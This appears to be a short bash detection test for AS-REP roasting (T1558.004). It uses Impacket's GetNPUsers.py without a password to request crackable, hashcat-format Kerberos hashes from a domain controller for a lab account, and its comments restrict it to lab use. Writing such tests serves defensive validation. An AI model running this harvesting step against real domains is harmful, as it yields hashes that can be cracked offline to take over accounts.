#!/usr/bin/env bash
# Test for T1558.004 - request a TGT without pre-authentication for a lab account that has
# 'Do not require Kerberos preauthentication' set (4768 with PreAuthType 0 on the DC). Needs Impacket.
# Usage: atomic_getnpusers_lab.sh <domain> <dc-ip> <test-user>. Run against a lab domain only.
set -euo pipefail
domain="${1:?usage: $0 <domain> <dc-ip> <test-user>}"; dc="${2:?}"; user="${3:?}"
printf '%s\n' "$user" > /tmp/t1558004_users.txt
GetNPUsers.py "$domain/" -usersfile /tmp/t1558004_users.txt -no-pass -dc-ip "$dc" -format hashcat || true
rm -f /tmp/t1558004_users.txt
echo "T1558.004 test"
